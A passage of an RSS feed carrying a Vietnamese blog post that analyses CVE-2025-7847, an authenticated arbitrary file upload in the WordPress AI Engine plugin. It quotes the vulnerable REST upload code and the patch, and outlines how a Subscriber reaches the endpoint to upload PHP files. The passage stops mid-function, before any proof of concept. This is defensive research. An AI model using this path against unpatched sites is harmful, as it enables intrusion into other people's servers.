&lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-forms/vulnerability/wordpress-ninja-forms-plugin-3-11-1-unauthenticated-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Ninja Forms Plugin &amp;lt; 3.11.1 is vulnerable to PHP Object Injection &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-7847 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-13-cve-2025-7847/</link>
      <pubDate>Thu, 13 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-13-cve-2025-7847/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;AI Engine&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; tồn tại lỗ hổng &lt;strong&gt;arbitrary file upload&lt;/strong&gt; do thiếu &lt;strong&gt;file type validation&lt;/strong&gt; trong hàm &lt;code&gt;rest_simpleFileUpload()&lt;/code&gt; ở các phiên bản &lt;strong&gt;2.9.3&lt;/strong&gt; và &lt;strong&gt;2.9.4&lt;/strong&gt;.&#xA;Điều này cho phép &lt;strong&gt;authenticated attackers&lt;/strong&gt; (những kẻ tấn công đã xác thực), với quyền &lt;strong&gt;Subscriber-level&lt;/strong&gt; trở lên, có thể &lt;strong&gt;upload arbitrary files&lt;/strong&gt; lên &lt;strong&gt;server&lt;/strong&gt; của trang web bị ảnh hưởng khi &lt;strong&gt;REST API&lt;/strong&gt; được bật, từ đó có thể dẫn đến &lt;strong&gt;remote code execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-7847&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-7847&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 2.9.3-2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xảy ra do hàm xử lý upload cho phép ghi file trực tiếp (&lt;code&gt;copy()&lt;/code&gt;, &lt;code&gt;file_put_contents()&lt;/code&gt;) mà &lt;strong&gt;không kiểm tra loại file hoặc xác thực người dùng&lt;/strong&gt;, nên attacker có thể &lt;strong&gt;upload file tùy ý (kể cả &lt;code&gt;.php&lt;/code&gt;)&lt;/strong&gt; vào thư mục uploads và thực thi mã độc.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/diff.png&#34; title=&#34;Xác thực file type&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Validate File Type&lt;/h2&gt;&lt;p&gt;Xác thực file type&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/diff.png&#39; alt=&#34;Validate File Type&#34; height=&#34;516&#34; width=&#34;1819&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Xác thực file type&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Validate filename extension for base64 uploads&#xA;$validate = wp_check_filetype( $filename );&#xA;if ( $validate[&amp;#39;type&amp;#39;] == false ) {&#xA;  throw new Exception( &amp;#39;File type is not allowed.&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã thêm kiểm tra loại tệp trong hàm &lt;code&gt;simpleFileUpload&lt;/code&gt; và &lt;code&gt;upload_file&lt;/code&gt; bằng &lt;code&gt;wp_check_filetype()&lt;/code&gt; để chỉ cho phép upload các định dạng hợp lệ dựa trên whilelist của WordPress&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một số Public API thông quan hàm &lt;code&gt;rest_api_init()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_api_init() {&#xA;  $public_api = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api&amp;#39; );&#xA;  if ( !$public_api ) {&#xA;    return;&#xA;  }&#xA;  $this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api_bearer_token&amp;#39; );&#xA;  if ( !empty( $this-&amp;gt;bearer_token ) ) {&#xA;    add_filter( &amp;#39;mwai_allow_public_api&amp;#39;, [ $this, &amp;#39;auth_via_bearer_token&amp;#39; ], 10, 3 );&#xA;  }&#xA;  register_rest_route( &amp;#39;mwai/v1&amp;#39;, &amp;#39;/simpleFileUpload&amp;#39;, [&#xA;    &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;    &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;rest_simpleFileUpload&amp;#39; ],&#xA;    &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;      return $this-&amp;gt;core-&amp;gt;can_access_public_api( &amp;#39;simpleFileUpload&amp;#39;, $request );&#xA;    },&#xA;  ] );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm sẽ kiểm tra option &lt;strong&gt;Public API&lt;/strong&gt; đã được bật hay chưa. Theo &lt;a href=&#34;https://ai.thehiddendocs.com/public-rest-api/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;document&lt;/a&gt; của plugin, mặc định option này sẽ không được bật:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System).&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Bạn có thể bặt ở nó Admin Dashboard tại &lt;code&gt;wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#34; title=&#34;enable the REST API&#34; data-thumbnail=&#34;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#34; data-sub-html=&#34;&lt;h2&gt;enable the REST API&lt;/h2&gt;&lt;p&gt;enable the REST API&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#39; alt=&#34;enable the REST API&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;enable the REST API&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo mô tả, khi bật option này lên, chỉ những &lt;code&gt;authentified API requests&lt;/code&gt; mới được thông qua. Có 2 cách để xác thực:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;X-WP-Nonce&lt;/code&gt;: Lấy thông qua JavaScript Object &lt;code&gt;wpApiSettings&lt;/code&gt; dành cho người dùng đã đăng nhập (Subcriber+)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;Bearer Token&lt;/code&gt;: Do admin cấu hình&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;public_api_bearer_token&amp;#39; );&#xA;if ( !empty( $this-&amp;gt;bearer_token ) ) {&#xA;  add_filter( &amp;#39;mwai_allow_public_api&amp;#39;, [ $this, &amp;#39;auth_via_bearer_token&amp;#39; ], 10, 3 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi Bearer Token được set,plugin sẽ &lt;strong&gt;đăng ký một filter&lt;/strong&gt; có tên &lt;code&gt;mwai_allow_public_api&lt;/code&gt;,&#xA;với &lt;strong&gt;callback&lt;/strong&gt; là phương thức &lt;code&gt;auth_via_bearer_token&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route( &amp;#39;mwai/v1&amp;#39;, &amp;#39;/simpleFileUpload&amp;#39;, [&#xA;  &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;  &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;rest_simpleFileUpload&amp;#39; ],&#xA;  &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;    return $this-&amp;gt;core-&amp;gt;can_access_public_api( &amp;#39;simpleFileUpload&amp;#39;, $request );&#xA;  },&#xA;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Một api được đăng ký với method POST:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Endpoint: &lt;code&gt;/wp-json/mwai/v1/simpleFileUpload&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Callback: &lt;code&gt;rest_simpleFileUpload&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Với &lt;code&gt;permission_callback&lt;/code&gt; là kết quả trả về của &lt;code&gt;can_access_public_api()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function can_access_public_api( $feature, $extra ) {&#xA;  $logged_in = is_user_logged_in();&#xA;  return apply_filters( &amp;#39;mwai_allow_public_api&amp;#39;, $logged_in, $feature, $extra );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong WP REST API, hàm &lt;code&gt;is_user_logged_in()&lt;/code&gt; sẽ trả về:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;true&lt;/code&gt;: Nếu người dùng đã đăng nhập và header &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; hợp lệ&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;false&lt;/code&gt;: Nếu người dùng chưa đăng nhập hoặc header &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; không hợp lệ&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;can_access_public_api&lt;/code&gt; sẽ gọi đến filter &lt;code&gt;mwai_allow_public_api&lt;/code&gt; được đăng ký ở trên =&amp;gt; &lt;code&gt;auth_via_bearer_token($logged_in, $feature, $extra)&lt;/code&gt; được gọi&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function auth_via_bearer_token( $allow, $feature, $extra ) {&#xA;  if ( !empty( $extra ) &amp;amp;&amp;amp; !empty( $extra-&amp;gt;get_header( &amp;#39;Authorization&amp;#39; ) ) ) {&#xA;    $token = $extra-&amp;gt;get_header( &amp;#39;Authorization&amp;#39; );&#xA;    $token = str_replace( &amp;#39;Bearer &amp;#39;, &amp;#39;&amp;#39;, $token );&#xA;    if ( $token === $this-&amp;gt;bearer_token ) {&#xA;      // We set the current user to the first admin.&#xA;      $admin = $this-&amp;gt;core-&amp;gt;get_admin_user();&#xA;      wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&#xA;      return true;&#xA;    }&#xA;  }&#xA;  return $allow;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;auth_via_bearer_token()&lt;/code&gt; dùng để xác thực bằng Bearer Token.&#xA;Quy trình của nó:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu request có header &lt;code&gt;Authorization&lt;/code&gt; chứa chuỗi &lt;code&gt;Bearer &amp;lt;token&amp;gt;&lt;/code&gt;&#xA;và giá trị &lt;code&gt;&amp;lt;token&amp;gt;&lt;/code&gt; trùng với token được lưu trong tùy chọn (&lt;code&gt;$this-&amp;gt;bearer_token&lt;/code&gt;), thì:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Gán người dùng hiện tại thành admin đầu tiên (&lt;code&gt;wp_set_current_user()&lt;/code&gt;),&lt;/li&gt;&#xA;&lt;li&gt;Trả về &lt;code&gt;true&lt;/code&gt; → cho phép truy cập API.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu không có hoặc token sai → trả về &lt;code&gt;$allow&lt;/code&gt;,&#xA;tức là kết quả kiểm tra ban đầu từ &lt;code&gt;is_user_logged_in()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Mặc định, ta sẽ không có &lt;strong&gt;Bearer Token&lt;/strong&gt; để xác thực, nên ta cần dựa vào &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; hợp lệ của Subcriber user =&amp;gt; &lt;code&gt;permission_callback=true&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_simpleFileUpload( $request ) {&#xA;  try {&#xA;    $params = $request-&amp;gt;get_params();&#xA;    $files = $request-&amp;gt;get_file_params();&#xA;    &#xA;    // Check if file is provided&#xA;    if ( empty( $files[&amp;#39;file&amp;#39;] ) ) {&#xA;      // Check for base64 encoded file data&#xA;      ...&#xA;      $result = $this-&amp;gt;simpleFileUpload( null, $base64, $filename, $purpose, $ttl, $target, $metadata );&#xA;    }&#xA;    else {&#xA;      // Handle regular file upload&#xA;      $file = $files[&amp;#39;file&amp;#39;];&#xA;      $purpose = isset( $params[&amp;#39;purpose&amp;#39;] ) ? $params[&amp;#39;purpose&amp;#39;] : &amp;#39;files&amp;#39;;&#xA;      $ttl = isset( $params[&amp;#39;ttl&amp;#39;] ) ? intval( $params[&amp;#39;ttl&amp;#39;] ) : 3600;&#xA;      $target = isset( $params[&amp;#39;target&amp;#39;] ) ? $params[&amp;#39;target&amp;#39;] : null;&#xA;      $metadata = isset( $params[&amp;#39;metadata&amp;#39;] ) ? $params[&amp;#39;metadata&amp;#39;] : [];&#xA;      &#xA;      if ( $this-&amp;gt;debug ) {&#xA;        $debug = sprintf( &amp;#39;REST [SimpleFileUpload]: file upload, name=%s, purpose=%s&amp;#39;, &#xA;          $file[&amp;#39;name&amp;#39;], &#xA;          $purpose &#xA;        );&#xA;        Meow_MWAI_Logging::log( $debug );&#xA;      }&#xA;      &#xA;      $result = $this-&amp;gt;simpleFileUpload( $file, null, null, $purpose, $ttl, $target, $metadata );&#xA;    }&#xA;    &#xA;    return new WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; $result ], 200 );&#xA;  }&#xA;  catch ( Exception $e ) {&#xA;    return new WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; $e-&amp;gt;getMessage() ], 500 );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;rest_simpleFileUpload()&lt;/code&gt; xử lý upload file qua REST API.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy tham số và file từ &lt;code&gt;$request&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu không có file, kiểm tra dữ liệu base64 và gọi &lt;code&gt;$this-&amp;gt;simpleFileUpload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu có file, lấy các tham số tùy chọn (&lt;code&gt;purpose&lt;/code&gt;, &lt;code&gt;ttl&lt;/code&gt;, &lt;code&gt;target&lt;/code&gt;, &lt;code&gt;metadata&lt;/code&gt;), ghi log nếu debug, rồi gọi &lt;code&gt;$this-&amp;gt;simpleFileUpload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trả về &lt;code&gt;WP_REST_Response&lt;/code&gt; với &lt;code&gt;success =&amp;gt; true&lt;/code&gt; và dữ liệu file, hoặc &lt;code&gt;success =&amp;gt; false&lt;/code&gt; nếu có lỗi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function simpleFileUpload( $file = null, $base64 = null, $filename = null, $purpose = &amp;#39;files&amp;#39;, $ttl = 3600, $target = null, $metadata = [] ) {&#xA;  ...&#xA;  try {&#xA;    if ( !empty( $base64 ) ) {&#xA;     ...&#xA;    }&#xA;    else if ( !empty( $file ) &amp;amp;&amp;amp; is_array( $file ) ) {&#xA;      // Handle regular file upload&#xA;      if ( !empty( $file[&amp;#39;error&amp;#39;] ) ) {&#xA;        throw new Exception( &amp;#39;File upload error: &amp;#39; . $file[&amp;#39;error&amp;#39;] );&#xA;      }&#xA;      &#xA;      $refId = $this-&amp;gt;core-&amp;gt;files-&amp;gt;upload_file(&#xA;        $file[&amp;#39;tmp_name&amp;#39;],&#xA;        $file[&amp;#39;name&amp;#39;],&#xA;        $purpose,&#xA;        $metadata,&#xA;        null, // envId&#xA;        $target,&#xA;        $ttl&#xA;      );&#xA;      &#xA;      $url = $this-&amp;gt;core-&amp;gt;files-&amp;gt;get_url( $refId );&#xA;      &#xA;      return [&#xA;        &amp;#39;id&amp;#39; =&amp;gt; $refId,&#xA;        &amp;#39;url&amp;#39; =&amp;gt; $url&#xA;      ];&#xA;    }&#xA;    else {&#xA;      throw new Exception( &amp;#39;Either a file or base64 data must be provided.&amp;#39; );&#xA;    }&#xA;  }&#xA;  catch ( Exception $e ) {&#xA;    throw new Exception( &amp;#39;File upload failed: &amp;#39; . $e-&amp;gt;getMessage() );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;simpleFileUpload()&lt;/code&gt; thực hiện upload file hoặc dữ liệu base64.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;$base64&lt;/code&gt; không rỗng → xử lý upload từ base64.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;$file&lt;/code&gt; là mảng hợp lệ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm tra lỗi upload (&lt;code&gt;$file[&#39;error&#39;]&lt;/code&gt;) → ném Exception nếu có lỗi.&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;$this-&amp;gt;core-&amp;gt;files-&amp;gt;upload_file()&lt;/code&gt; để lưu file.&lt;/li&gt;&#xA;&lt;li&gt;Lấy URL file qua &lt;code&gt;$this-&amp;gt;core-&amp;gt;files-&amp;gt;get_url($refId)&lt;/code&gt; và trả về mảng &lt;code&gt;[&#39;id&#39; =&amp;gt; $refId, &#39;url&#39; =&amp;gt; $url]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function upload_file($path,$filename = null,$purpose = null,$metadata = null,$envId = null,$target = null,$expiry = null) {&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/image.php&amp;#39; );&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/media.php&amp;#39; );&#xA;&#xA;  $target = empty( $target ) ? $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;image_local_upload&amp;#39; ) : $target;&#xA;  $expiry = empty( $expiry ) ? $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;image_expires&amp;#39; ) : $expiry;&#xA;&#xA;  $expires = ( $expiry === &amp;#39;never&amp;#39; || empty( $expiry ) ) ? null : date( &amp;#39;Y-m-d H:i:s&amp;#39;, time() &amp;#43; intval( $expiry ) );&#xA;  $refId = $this-&amp;gt;generate_refId();&#xA;  $url = null;&#xA;  if ( empty( $filename ) ) {&#xA;    $parsed_url = parse_url( $path, PHP_URL_PATH );&#xA;    $filename = basename( $parsed_url );&#xA;    $extension = pathinfo( $filename, PATHINFO_EXTENSION );&#xA;  }&#xA;  else {&#xA;    $extension = pathinfo( $filename, PATHINFO_EXTENSION );&#xA;  }&#xA;  $newFilename = $refId . &amp;#39;.&amp;#39; 